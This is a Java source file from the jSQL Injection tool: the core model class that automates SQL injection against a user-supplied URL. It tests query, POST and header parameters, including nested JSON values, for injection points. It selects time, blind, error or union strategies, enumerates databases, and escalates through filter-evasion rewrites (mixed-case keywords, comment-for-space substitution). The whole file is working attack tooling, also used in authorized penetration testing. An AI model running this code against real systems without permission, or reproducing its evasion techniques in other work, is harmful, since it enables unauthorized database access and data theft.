/*******************************************************************************
 * Copyhacked (H) 2012-2016.
 * This program and the accompanying materials
 * are made available under no term at all, use it like
 * you want, but share and discuss about it
 * every time possible with every body.
 * 
 * Contributors:
 *      ron190 at ymail dot com - initial implementation
 ******************************************************************************/
package com.jsql.model;

import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.UnsupportedEncodingException;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;
import java.net.URLDecoder;
import java.nio.charset.Charset;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.security.PrivilegedActionException;
import java.util.AbstractMap.SimpleEntry;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.EnumMap;
import java.util.Iterator;
import java.util.List;
import java.util.Map;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import java.util.stream.Collectors;
import java.util.stream.Stream;

import javax.security.auth.login.LoginException;

import org.apache.commons.lang3.StringUtils;
import org.apache.log4j.Logger;
import org.ietf.jgss.GSSException;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import com.jsql.i18n.I18n;
import com.jsql.model.accessible.DataAccess;
import com.jsql.model.accessible.RessourceAccess;
import com.jsql.model.bean.util.Header;
import com.jsql.model.bean.util.Interaction;
import com.jsql.model.bean.util.Request;
import com.jsql.model.exception.IgnoreMessageException;
import com.jsql.model.exception.InjectionFailureException;
import com.jsql.model.exception.JSqlException;
import com.jsql.model.injection.method.MethodInjection;
import com.jsql.model.injection.strategy.StrategyInjection;
import com.jsql.model.injection.strategy.StrategyInjectionNormal;
import com.jsql.model.injection.vendor.Vendor;
import com.jsql.model.suspendable.SuspendableGetCharInsertion;
import com.jsql.model.suspendable.SuspendableGetVendor;
import com.jsql.util.AuthenticationUtil;
import com.jsql.util.ConnectionUtil;
import com.jsql.util.GitUtil.ShowOnConsole;
import com.jsql.util.HeaderUtil;
import com.jsql.util.ParameterUtil;
import com.jsql.util.PreferencesUtil;
import com.jsql.util.ProxyUtil;
import com.jsql.util.ThreadUtil;

import net.sourceforge.spnego.SpnegoHttpURLConnection;

/**
 * Model class of MVC pattern for processing SQL injection automatically.<br>
 * Different views can be attached to this observable, like Swing or command line, in order to separate
 * the functional job from the graphical processing.<br>
 * The Model has a specific database vendor and strategy which run an automatic injection to get name of
 * databases, tables, columns and values, and it can also retreive resources like files and shell.<br>
 * Tasks are run in multi-threads in general to speed the process.
 */
public class InjectionModel extends AbstractModelObservable {
	
    /**
     * Log4j logger sent to view.
     */
    private static final Logger LOGGER = Logger.getRootLogger();
    
    /**
     * Current version of application.
     */
    private static final String VERSION_JSQL = "0.81";
    
    public static final String STAR = "*";
    
    // TODO Pojo injection
    /**
     * HTML body of page successfully responding to
     * multiple fields selection (select 1,2,3,..).
     */
    private String srcSuccess = "";
    
    /**
     * initialUrl transformed to a correct injection url.
     */
    private String indexesInUrl = "";

    /**
     * Current version of database.
     */
    private String versionDatabase;
    
    /**
     * Selected database.
     */
    private String nameDatabase;
    
    /**
     * User connected to database.
     */
    private String username;
    
    /**
     * Database vendor currently used.
     * It can be switched to another vendor by automatic detection or manual selection.
     */
    private Vendor vendor = Vendor.MYSQL;

    /**
     * Database vendor selected by user (default UNDEFINED).
     * If not UNDEFINED then the next injection will be forced to use the selected vendor.
     */
    private Vendor vendorByUser = Vendor.AUTO;
    
    /**
     * Current injection strategy.
     */
    private StrategyInjection strategy;
    
    /**
     * Allow to directly start an injection after a failed one
     * without asking the user 'Start a new injection?'.
     */
    private boolean injectionAlreadyBuilt = false;
    
    private boolean isScanning = false;

    /**
     * Current evasion step, 0 is 'no evasion'
     */
    private int stepSecurity = 0;
    
    public void resetModel() {
        // TODO make injection pojo for all fields
        ((StrategyInjectionNormal) StrategyInjection.NORMAL.instance()).setVisibleIndex(null);
        this.indexesInUrl = "";
        
        this.versionDatabase = null;
        this.nameDatabase = null;
        this.username = null;
        
        this.setIsStoppedByUser(false);
        this.injectionAlreadyBuilt = false;
        
        this.strategy = null;
        
        RessourceAccess.setReadingIsAllowed(false);
        
        ThreadUtil.reset();
    }

    /**
     * Prepare the injection process, can be interrupted by the user (via shouldStopAll).
     * Erase all attributes eventually defined in a previous injection.
     */
    public void beginInjection() {
        this.resetModel();
        
        // TODO Extract in method
        try {
            if (!ProxyUtil.isChecked(ShowOnConsole.YES)) {
                return;
            }
            
            LOGGER.info(I18n.valueByKey("LOG_START_INJECTION") +": "+ ConnectionUtil.getUrlByUser());
            
            ParameterUtil.checkParametersFormat(true, true, null);
            
            LOGGER.trace(I18n.valueByKey("LOG_CONNECTION_TEST"));
            ConnectionUtil.testConnection();
            
            boolean hasFoundInjection = false;
            
            hasFoundInjection = this.testParameters(MethodInjection.QUERY, ParameterUtil.getQueryStringAsString(), ParameterUtil.getQueryString());

            if (!hasFoundInjection) {
                hasFoundInjection = this.testParameters(MethodInjection.REQUEST, ParameterUtil.getRequestAsString(), ParameterUtil.getRequest());
            }
            
            if (!hasFoundInjection) {
                hasFoundInjection = this.testParameters(MethodInjection.HEADER, ParameterUtil.getHeaderAsString(), ParameterUtil.getHeader());
            }
            
            LOGGER.trace(I18n.valueByKey("LOG_DONE"));
            this.injectionAlreadyBuilt = true;
        } catch (JSqlException e) {
            LOGGER.warn(e.getMessage(), e);
        } finally {
            Request request = new Request();
            request.setMessage(Interaction.END_PREPARATION);
            this.sendToViews(request);
        }
    }
    
    public static List<SimpleEntry<String, String>> loopThroughJson(Object jsonEntity, String parentName, SimpleEntry<String, String> parentXPath) {
        List<SimpleEntry<String, String>> attributesXPath = new ArrayList<>();
        
        if (jsonEntity instanceof JSONObject) {
            
            JSONObject jsonObjectEntity = (JSONObject) jsonEntity;
            Iterator<?> keys = jsonObjectEntity.keys();
            while (keys.hasNext()) {
                String key = (String) keys.next();
                Object value = jsonObjectEntity.get(key);
                String xpath = parentName +"."+ key;
                
                if (value instanceof JSONArray) {
                    attributesXPath.addAll(loopThroughJson(value, xpath, parentXPath));
                } else {
                    SimpleEntry<String, String> c = new SimpleEntry<>(xpath, (String) value);
                    attributesXPath.add(c);
                    
                    if (parentXPath == null) {
                        jsonObjectEntity.put(key, value.toString().replaceAll(Pattern.quote(InjectionModel.STAR) +"$", ""));
                    } else if (c.equals(parentXPath)) {
                        jsonObjectEntity.put(key, value + InjectionModel.STAR);
                    }
                }
            }
            
        } else if (jsonEntity instanceof JSONArray) {
            
            JSONArray jsonArrayEntity = (JSONArray) jsonEntity;
            for (int i = 0; i < jsonArrayEntity.length(); i++) {
                Object jsonEntityInArray = jsonArrayEntity.get(i);
                if(!(jsonEntityInArray instanceof JSONObject) && !(jsonEntityInArray instanceof JSONArray)){
                    continue;
                }
                
                JSONObject jsonObjectEntity = jsonArrayEntity.getJSONObject(i);
                
                Iterator<?> keys = jsonObjectEntity.keys();
                while (keys.hasNext()) {
                    String key = (String) keys.next();
                    Object value = jsonObjectEntity.opt(key);
                    
                    if (value instanceof JSONArray) {
                        attributesXPath.addAll(loopThroughJson(value, parentName +"."+ key, parentXPath));
                    } else if (value instanceof String) {
                        SimpleEntry<String, String> s = new SimpleEntry<>(parentName +"."+ key, (String) value);
                        attributesXPath.add(s);
                        
                        if (parentXPath == null) {
                            jsonObjectEntity.put(key, value.toString().replaceAll(Pattern.quote(InjectionModel.STAR) +"$", ""));
                        } else if (s.equals(parentXPath)) {
                            jsonObjectEntity.put(key, value + InjectionModel.STAR);
                        }
                    }
                }
            }
            
        }
        
        return attributesXPath;
    }
    
    private boolean testParameters(MethodInjection methodInjection, String paramsAsString, List<SimpleEntry<String, String>> params) throws JSqlException {
        boolean hasFoundInjection = false;
        
        if (
            PreferencesUtil.isCheckingAllParam()
            || ConnectionUtil.getMethodInjection() == methodInjection
        ) {
            ConnectionUtil.setMethodInjection(methodInjection);
            if (!methodInjection.isCheckingAllParam() && !paramsAsString.contains(InjectionModel.STAR)) {
                params.stream().reduce((a, b) -> b).ifPresent(e -> e.setValue(e.getValue() + InjectionModel.STAR));
                hasFoundInjection = this.testStrategies(IS_CHECKING_ALL_PARAMETERS, !IS_JSON, params.stream().reduce((a, b) -> b).get());
            } else if (paramsAsString.contains(InjectionModel.STAR)) {
                LOGGER.info("Checking single "+ methodInjection.name() +" parameter with injection point at *");
                hasFoundInjection = this.testStrategies(!IS_CHECKING_ALL_PARAMETERS, !IS_JSON, null);
            } else {
                for (SimpleEntry<String, String> paramBase: params) {

                    for (SimpleEntry<String, String> paramStar: params) {
                        if (paramStar == paramBase) {
                            
                            Object jsonEntity = null;
                            try {
                                jsonEntity = new JSONObject(paramStar.getValue());
                            } catch (JSONException e) {
                                try {
                                    jsonEntity = new JSONArray(paramStar.getValue());
                                } catch (JSONException ee) {
                                    // ignore
                                }
                            }
                            List<SimpleEntry<String, String>> attributesJson = loopThroughJson(jsonEntity, "root", null);

                            if (PreferencesUtil.isCheckingAllJSONParam() && !attributesJson.isEmpty()) {
                                for (SimpleEntry<String, String> parentXPath: attributesJson) {
                                    loopThroughJson(jsonEntity, "root", null);
                                    loopThroughJson(jsonEntity, "root", parentXPath);
                                    
                                    paramStar.setValue(jsonEntity.toString());
                                    
                                    try {
                                        LOGGER.info("Checking JSON "+ methodInjection.name() +" parameter "+ parentXPath.getKey() +"="+ parentXPath.getValue().replace(InjectionModel.STAR, ""));
                                        hasFoundInjection = this.testStrategies(IS_CHECKING_ALL_PARAMETERS, IS_JSON, paramBase);
                                        break;
                                    } catch (JSqlException e) {
                                        LOGGER.warn("No "+ methodInjection.name() +" injection found for JSON "+ methodInjection.name() +" parameter "+ parentXPath.getKey() +"="+ parentXPath.getValue().replace(InjectionModel.STAR, ""), e);
                                    } finally {
                                        params.stream().forEach(e -> e.setValue(e.getValue().replaceAll(Pattern.quote(InjectionModel.STAR) +"$", "")));
                                    }
                                }
                            } else {
                                paramStar.setValue(paramStar.getValue() + InjectionModel.STAR);
                                
                                try {
                                    LOGGER.info("Checking "+ methodInjection.name() +" parameter "+ paramBase.getKey() +"="+ paramBase.getValue().replace(InjectionModel.STAR, ""));
                                    hasFoundInjection = this.testStrategies(IS_CHECKING_ALL_PARAMETERS, !IS_JSON, paramBase);
                                    break;
                                } catch (JSqlException e) {
                                    LOGGER.warn("No "+ methodInjection.name() +" injection found for parameter "+ paramBase.getKey() +"="+ paramBase.getValue().replace(InjectionModel.STAR, ""), e);
                                } finally {
                                    params.stream().forEach(e -> e.setValue(e.getValue().replaceAll(Pattern.quote(InjectionModel.STAR) +"$", "")));
                                }
                            }
                            
                            
                        }
                    }
                    if (hasFoundInjection) {
                        paramBase.setValue(paramBase.getValue().replace("*", "") +"*");
                        break;
                    }
                    
                }
            }
        }
        
        return hasFoundInjection;
    }
    
    private static final boolean IS_CHECKING_ALL_PARAMETERS = true;
    private static final boolean IS_JSON = true;
    
    private boolean testStrategies(boolean checkAllParameters, boolean isJson, SimpleEntry<String, String> parameter) throws JSqlException {
        // Define insertionCharacter, i.e, -1 in "[..].php?id=-1 union select[..]",
        LOGGER.trace(I18n.valueByKey("LOG_GET_INSERTION_CHARACTER"));
        
        String characterInsertionByUser = ParameterUtil.checkParametersFormat(false, checkAllParameters, parameter);
        if (parameter != null) {
            String charInsertion = new SuspendableGetCharInsertion().run(characterInsertionByUser, parameter, isJson);
            LOGGER.info(I18n.valueByKey("LOG_USING_INSERTION_CHARACTER") +" ["+ charInsertion.replace(InjectionModel.STAR, "") +"]");
        }
        
        this.vendor = new SuspendableGetVendor().run();

        // Test each injection strategies: time, blind, error, normal
        StrategyInjection.TIME.instance().checkApplicability();
        StrategyInjection.BLIND.instance().checkApplicability();
        StrategyInjection.ERROR.instance().checkApplicability();
        StrategyInjection.NORMAL.instance().checkApplicability();

        // Choose the most efficient strategy: normal > error > blind > time
        if (StrategyInjection.NORMAL.instance().isApplicable()) {
            StrategyInjection.NORMAL.instance().activateStrategy();
            
        } else if (StrategyInjection.ERROR.instance().isApplicable()) {
            StrategyInjection.ERROR.instance().activateStrategy();
            
        } else if (StrategyInjection.BLIND.instance().isApplicable()) {
            StrategyInjection.BLIND.instance().activateStrategy();
            
        } else if (StrategyInjection.TIME.instance().isApplicable()) {
            StrategyInjection.TIME.instance().activateStrategy();
            
        } else if (PreferencesUtil.isEvasionEnabled() && this.stepSecurity < 3) {
            // No injection possible, increase evasion level and restart whole process
            this.stepSecurity++;

            LOGGER.warn("Injection failed, testing evasion level "+ this.stepSecurity +"...");
            
            Request request = new Request();
            request.setMessage(Interaction.RESET_STRATEGY_LABEL);
            this.sendToViews(request);
            
            // sinon perte de insertionCharacter entre 2 injections
//            ConnectionUtil.setQueryString(ConnectionUtil.getQueryString() + this.charInsertion);
            this.beginInjection();
            
            return false;
        } else {
            throw new InjectionFailureException("No injection found");
        }

        if (!this.isScanning) {
            if (!PreferencesUtil.isNotInjectingMetadata()) {
                DataAccess.getDatabaseInfos();
            }
            DataAccess.listDatabases();
        }
        
        return true;
    }
    
    /**
     * Run a HTTP connection to the web server.
     * @param dataInjection SQL query
     * @param responseHeader unused
     * @return source code of current page
     */
    @Override
    public String inject(String newDataInjection, boolean isUsingIndex) {
        // Temporary url, we go from "select 1,2,3,4..." to "select 1,([complex query]),2...", but keep initial url
        String urlInjection = ConnectionUtil.getUrlBase();
        
        String dataInjection = " "+ newDataInjection;
        
        urlInjection = this.buildURL(urlInjection, isUsingIndex, dataInjection);

        urlInjection = urlInjection
            .trim()
            // Remove comments
            .replaceAll("(?s)/\\*.*?\\*/", "")
            // Remove spaces after a word
            .replaceAll("([^\\s\\w])(\\s+)", "$1")
            // Remove spaces before a word
            .replaceAll("(\\s+)([^\\s\\w])", "$2")
            // Replace spaces
            .replaceAll("\\s+", "+");

        URL urlObject = null;
        try {
            urlObject = new URL(urlInjection);
        } catch (MalformedURLException e) {
            LOGGER.warn("Incorrect Query Url: "+ e.getMessage(), e);
            return "";
        }

        /**
         * Build the GET query string infos
         * Add primary evasion
         * TODO separate method
         */
        // TODO Extract in method
        if (!ParameterUtil.getQueryString().isEmpty()) {
            urlInjection += this.buildQuery(MethodInjection.QUERY, ParameterUtil.getQueryStringAsString(), isUsingIndex, dataInjection);
            
            if (ConnectionUtil.getTokenCsrf() != null) {
                urlInjection += "&"+ ConnectionUtil.getTokenCsrf().getKey() +"="+ ConnectionUtil.getTokenCsrf().getValue();
            }
            
            try {
                // Evasion
                if (this.stepSecurity == 1) {
                    // Replace character '+'
                    urlInjection = urlInjection
                        .replaceAll("--\\+", "--")
                        .replaceAll("7330%2b1", "7331");
                    
                } else if (this.stepSecurity == 2) {
                    // Change case
                    urlInjection = urlInjection
                        .replaceAll("union\\+", "uNiOn+")
                        .replaceAll("select\\+", "sElEcT+")
                        .replaceAll("from\\+", "FrOm+")
                        .replaceAll("from\\(", "FrOm(")
                        .replaceAll("where\\+", "wHeRe+")
                        .replaceAll("([AE])=0x", "$1+lIkE+0x");
                    
                } else if (this.stepSecurity == 3) {
                    // Change Case and Space
                    urlInjection = urlInjection
                        .replaceAll("union\\+", "uNiOn/**/")
                        .replaceAll("select\\+", "sElEcT/**/")
                        .replaceAll("from\\+", "FrOm/**/")
                        .replaceAll("from\\(", "FrOm(")
                        .replaceAll("where\\+", "wHeRe/**/")
                        .replaceAll("([AE])=0x", "$1/**/lIkE/**/0x");
                    urlInjection = urlInjection
                        .replaceAll("--\\+", "--")
                        .replaceAll("\\+", "/**/");
                }

                urlObject = new URL(urlInjection);
            } catch (MalformedURLException e) {
                LOGGER.warn("Incorrect Evasion Url: "+ e.getMessage(), e);
            }
        } else {
            if (ConnectionUtil.getTokenCsrf() != null) {
                urlInjection += "?"+ ConnectionUtil.getTokenCsrf().getKey() +"="+ ConnectionUtil.getTokenCsrf().getValue();
            }
        }
        
        HttpURLConnection connection;
        String pageSource = "";
        
        // Define the connection
        try {
            
            // TODO separate method
            // Block Opening Connection
            if (AuthenticationUtil.isKerberos()) {
                String kerberosConfiguration =
                    Pattern
                        .compile("(?s)\\{.*")
                        .matcher(StringUtils.join(Files.readAllLines(Paths.get(AuthenticationUtil.getPathKerberosLogin()), Charset.defaultCharset()), ""))
                        .replaceAll("")
                        .trim();
                
                SpnegoHttpURLConnection spnego = new SpnegoHttpURLConnection(kerberosConfiguration);
                connection = spnego.connect(urlObject);
            } else {
                connection = (HttpURLConnection) urlObject.openConnection();
            }
            
            connection.setReadTimeout(ConnectionUtil.getTimeout());
            connection.setConnectTimeout(ConnectionUtil.getTimeout());
            connection.setDefaultUseCaches(false);
            
            connection.setRequestProperty("Pragma", "no-cache");
            connection.setRequestProperty("Cache-Control", "no-cache");
            connection.setRequestProperty("Expires", "-1");
            
            // Csrf
            
            if (ConnectionUtil.getTokenCsrf() != null) {
                connection.setRequestProperty(ConnectionUtil.getTokenCsrf().getKey(), ConnectionUtil.getTokenCsrf().getValue());
            }
            
            ConnectionUtil.fixJcifsTimeout(connection);

            Map<Header, Object> msgHeader = new EnumMap<>(Header.class);
            msgHeader.put(Header.URL, urlInjection);
            
            /**
             * Build the HEADER and logs infos
             * #Need primary evasion
             */
            // TODO Extract in method
            if (!ParameterUtil.getHeader().isEmpty()) {
                Stream.of(this.buildQuery(MethodInjection.HEADER, ParameterUtil.getHeaderAsString(), isUsingIndex, dataInjection).split("\\\\r\\\\n"))
                .forEach(e -> {
                    if (e.split(":").length == 2) {
                        HeaderUtil.sanitizeHeaders(connection, new SimpleEntry<String, String>(e.split(":")[0], e.split(":")[1]));
                    }
                });
                
                msgHeader.put(Header.HEADER, this.buildQuery(MethodInjection.HEADER, ParameterUtil.getHeaderAsString(), isUsingIndex, dataInjection));
            }
    
            /**
             * Build the POST and logs infos
             * #Need primary evasion
             * TODO separate method
             */
            // TODO Extract in method
            if (!ParameterUtil.getRequest().isEmpty() || ConnectionUtil.getTokenCsrf() != null) {
                try {
                    ConnectionUtil.fixCustomRequestMethod(connection, ConnectionUtil.getTypeRequest());
                    
                    connection.setDoOutput(true);
                    connection.addRequestProperty("Content-Type", "application/x-www-form-urlencoded");
    
                    DataOutputStream dataOut = new DataOutputStream(connection.getOutputStream());
                    if (ConnectionUtil.getTokenCsrf() != null) {
                        dataOut.writeBytes(ConnectionUtil.getTokenCsrf().getKey() +"="+ ConnectionUtil.getTokenCsrf().getValue() +"&");
                    }
                    if (ConnectionUtil.getTypeRequest().matches("PUT|POST")) {
                        dataOut.writeBytes(this.buildQuery(MethodInjection.REQUEST, ParameterUtil.getRequestAsString(), isUsingIndex, dataInjection));
                    }
                    dataOut.flush();
                    dataOut.close();
                    
                    msgHeader.put(Header.POST, this.buildQuery(MethodInjection.REQUEST, ParameterUtil.getRequestAsString(), isUsingIndex, dataInjection));
                } catch (IOException e) {
                    LOGGER.warn("Error during Request connection: "+ e.getMessage(), e);
                }
            }
            
            msgHeader.put(Header.RESPONSE, HeaderUtil.getHttpHeaders(connection));
            
            try {
                pageSource = ConnectionUtil.getSource(connection);
            } catch (Exception e) {
                LOGGER.error(e, e);
            }
            
            // Calling connection.disconnect() is not required, further calls will follow
            
            msgHeader.put(Header.SOURCE, pageSource);
            
            // Inform the view about the log infos
            Request request = new Request();
            request.setMessage(Interaction.MESSAGE_HEADER);
            request.setParameters(msgHeader);
            this.sendToViews(request);
            
        } catch (
            // Exception for General and Spnego Opening Connection
            IOException | LoginException | GSSException | PrivilegedActionException e
        ) {
            LOGGER.warn("Error during connection: "+ e.getMessage(), e);
        }

        // return the source code of the page
        return pageSource;
    }
    
    /**
     * Build correct data for GET, POST, HEADER.<br>
     * Each can be:<br>
     *  - raw data (no injection)<br>
     *  - SQL query without index requirement<br>
     *  - SQL query with index requirement.
     * @param dataType Current method to build
     * @param urlBase Beginning of the request data
     * @param isUsingIndex False if request doesn't use indexes
     * @param sqlTrail SQL statement
     * @return Final data
     */
    private String buildURL(String urlBase, boolean isUsingIndex, String sqlTrail) {
        if (urlBase.contains(InjectionModel.STAR)) {
            if (!isUsingIndex) {
                return urlBase.replace(InjectionModel.STAR, sqlTrail);
            } else {
                return
                    urlBase.replace(
                        InjectionModel.STAR,
                        this.indexesInUrl.replaceAll(
                            "1337" + ((StrategyInjectionNormal) StrategyInjection.NORMAL.instance()).getVisibleIndex() + "7331",
                            /**
                             * Oracle column often contains $, which is reserved for regex.
                             * => need to be escape with quoteReplacement()
                             */
                            Matcher.quoteReplacement(sqlTrail)
                        )
                    )
                ;
            }
        }
        return urlBase;
    }
    
    private String buildQuery(MethodInjection methodInjection, String paramLead, boolean isUsingIndex, String sqlTrail) {
        String query;
        
        // TODO simplify
        if (ConnectionUtil.getMethodInjection() != methodInjection || ConnectionUtil.getUrlBase().contains(InjectionModel.STAR)) {
            query = paramLead;
        } else if (paramLead.contains(InjectionModel.STAR)) {
            if (!isUsingIndex) {
                query = paramLead.replace(InjectionModel.STAR, sqlTrail);
            } else {
                query =
                    paramLead.replace(
                        InjectionModel.STAR,
                        this.indexesInUrl.replaceAll(
                            "1337" + ((StrategyInjectionNormal) StrategyInjection.NORMAL.instance()).getVisibleIndex() + "7331",
                            /**
                             * Oracle column often contains $, which is reserved for regex.
                             * => need to be escape with quoteReplacement()
                             */
                            Matcher.quoteReplacement(sqlTrail)
                        )
                    )
                ;
            }
        } else {
            if (!isUsingIndex) {
                query = paramLead + sqlTrail;
            } else {
                query =
                    paramLead
                    + this.indexesInUrl.replaceAll(
                        "1337" + ((StrategyInjectionNormal) StrategyInjection.NORMAL.instance()).getVisibleIndex() + "7331",
                        /**
                         * Oracle column often contains $, which is reserved for regex.
                         * => need to be escape with quoteReplacement()
                         */
                        Matcher.quoteReplacement(sqlTrail)
                    )
                ;
            }
        }
        
        query = query.trim();
        
        // Remove comments
        query = query.replaceAll("(?s)/\\*.*?\\*/", "");
                
        // Remove spaces after a word
        query = query.replaceAll("([^\\s\\w])(\\s+)", "$1");
    
        // Remove spaces before a word
        query = query.replaceAll("(\\s+)([^\\s\\w])", "$2");

        // Replace spaces
        query = query.replaceAll("\\s+", "+");
        
        // Add ending line comment by vendor
        query = query + this.vendor.instance().endingComment();
        
        return query;
    }
    
    /**
     * Display source code in console.
     * @param message Error message
     * @param source Text to display in console
     */
    public void sendResponseFromSite(String message, String source) {
        LOGGER.warn(message + ", response from site:");
        LOGGER.warn(">>>" + source);
    }

    /**
     * Send each parameters from the GUI to the model in order to
     * start the preparation of injection, the injection process is
     * started in a new thread via model function inputValidation().
     */
    public void controlInput(
        String urlQuery,
        String dataRequest,
        String dataHeader,
        MethodInjection methodInjection,
        String typeRequest,
        Boolean isScanning
    ) {
        try {
                
            if (!urlQuery.isEmpty() && !urlQuery.matches("(?i)^https?://.*")) {
                if (!urlQuery.matches("(?i)^\\w+://.*")) {
                    LOGGER.info("Undefined URL protocol, forcing to [http://]");
                    urlQuery = "http://"+ urlQuery;
                } else {
                    throw new MalformedURLException("unknown URL protocol");
                }
            }
            
        	// TODO seperate method in ConnectionUtil
            URL url = new URL(urlQuery);
            if ("".equals(urlQuery) || "".equals(url.getHost())) {
                throw new MalformedURLException("empty URL");
            }
            
            ConnectionUtil.setUrlByUser(urlQuery);
            
            // Parse url and GET query string
            ParameterUtil.setQueryString(new ArrayList<SimpleEntry<String, String>>());
            Matcher regexSearch = Pattern.compile("(.*\\?)(.*)").matcher(urlQuery);
            if (regexSearch.find()) {
                ConnectionUtil.setUrlBase(regexSearch.group(1));
                if (!"".equals(url.getQuery())) {
                    ParameterUtil.setQueryString(
                        Pattern.compile("&").splitAsStream(regexSearch.group(2))
                        .map(s -> Arrays.copyOf(s.split("="), 2))
                        .map(o -> new SimpleEntry<String, String>(o[0], o[1] == null ? "" : o[1]))
                        .collect(Collectors.toList())
                    );
                }
            } else {
                ConnectionUtil.setUrlBase(urlQuery);
            }
            
            // Define other methods
            ParameterUtil.setRequest(
                Pattern
                    .compile("&")
                    .splitAsStream(dataRequest)
                    .map(s -> Arrays.copyOf(s.split("="), 2))
                    .map(o -> new SimpleEntry<String, String>(o[0], o[1] == null ? "" : o[1]))
                    .collect(Collectors.toList())
            );
            ParameterUtil.setHeader(
                Pattern
                    .compile("\\\\r\\\\n")
                    .splitAsStream(dataHeader)
                    .map(s -> Arrays.copyOf(s.split(":"), 2))
                    .map(o -> new SimpleEntry<String, String>(o[0], o[1] == null ? "" : o[1]))
                    .collect(Collectors.toList())
            );
            ConnectionUtil.setMethodInjection(methodInjection);
            ConnectionUtil.setTypeRequest(typeRequest);
            
            // Reset level of evasion
            this.stepSecurity = 0;
            
            // TODO separate method
            if (isScanning) {
                this.beginInjection();
            } else {
                // Start the model injection process in a thread
                new Thread(InjectionModel.this::beginInjection, "ThreadBeginInjection").start();
            }
        } catch (MalformedURLException e) {
            LOGGER.warn("Incorrect Url: "+ e.getMessage(), e);
            
            // Incorrect URL, reset the start button
            Request request = new Request();
            request.setMessage(Interaction.END_PREPARATION);
            this.sendToViews(request);
        }
    }
    
    // TODO Util
    public void displayVersion() {
        String versionJava = System.getProperty("java.version");
        String nameSystemArchitecture = System.getProperty("os.arch");
        LOGGER.trace(
            "jSQL Injection v" + VERSION_JSQL
            + " on Java "+ versionJava
            +"-"+ nameSystemArchitecture
            +"-"+ System.getProperty("user.language")
        );
    }
    
    public String getDatabaseInfos() {
        return
    		"Database ["+ this.nameDatabase +"] "
            + "on "+ this.vendor +" ["+ this.versionDatabase +"] "
            + "for user ["+ this.username +"]";
    }

    public void setDatabaseInfos(String versionDatabase, String nameDatabase, String username) {
        this.versionDatabase = versionDatabase;
        this.nameDatabase = nameDatabase;
        this.username = username;
    }
    
    // Getters and setters
    
    public Vendor getVendor() {
        return this.vendor;
    }

    public Vendor getVendorByUser() {
        return this.vendorByUser;
    }

    public void setVendorByUser(Vendor vendorByUser) {
        this.vendorByUser = vendorByUser;
    }
    
    public StrategyInjection getStrategy() {
    	return this.strategy;
    }

    public void setStrategy(StrategyInjection strategy) {
        this.strategy = strategy;
    }

    public String getSrcSuccess() {
        return this.srcSuccess;
    }

    public void setSrcSuccess(String srcSuccess) {
        this.srcSuccess = srcSuccess;
    }

    public String getIndexesInUrl() {
        return this.indexesInUrl;
    }

    public void setIndexesInUrl(String indexesInUrl) {
        this.indexesInUrl = indexesInUrl;
    }

    public boolean isInjectionAlreadyBuilt() {
        return this.injectionAlreadyBuilt;
    }

    public void setIsScanning(boolean isScanning) {
        this.isScanning = isScanning;
    }

    public static String getVersionJsql() {
        return VERSION_JSQL;
    }

    public int getStepSecurity() {
        return this.stepSecurity;
    }

}
